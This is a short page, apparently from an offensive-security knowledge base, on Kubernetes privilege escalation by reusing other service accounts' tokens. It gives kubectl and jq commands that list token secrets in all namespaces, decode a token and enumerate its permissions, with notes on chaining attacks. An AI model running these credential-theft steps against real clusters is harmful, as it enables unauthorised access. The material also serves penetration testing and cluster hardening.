---
title: "Service account token abuse: reusing other accounts' tokens"
description: "Escalating in Kubernetes by obtaining and reusing another service account's token, read from a secret, mounted in a co-located pod, or minted through permissions on the account, to act as that identity when it holds more than the current one."
keywords:
  - service account token
  - token reuse
  - secret read
  - kubernetes identity
  - privilege escalation
---

# Service account token abuse

Service accounts are identities, and their tokens are bearer credentials: whoever holds one acts as that account. Escalation is finding a token for a more privileged account, from a readable secret, a co-located pod's mount, or by minting one where you have rights over the account.

```bash
# Legacy token secrets (still present on older clusters)
kubectl get secrets -A -o json | jq -r '.items[]|select(.type=="kubernetes.io/service-account-token")|.metadata.namespace+"/"+.metadata.name'
kubectl get secret <sa-token-secret> -o jsonpath='{.data.token}' | base64 -d

# Use the token
kubectl --token=<token> auth can-i --list
```

## Exploitation notes

- Any readable secret of type `service-account-token` is a ready identity; check what it can do before using it.
- On newer clusters tokens are short-lived and projected, not stored in secrets, so prefer the [TokenRequest API](tokenrequest-api.md) or a pod mount.
- Chain from a secret read granted by an [Over-permissive role](over-permissive-roles.md).

## References

- [Kubernetes: service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes: managing service accounts](https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/)
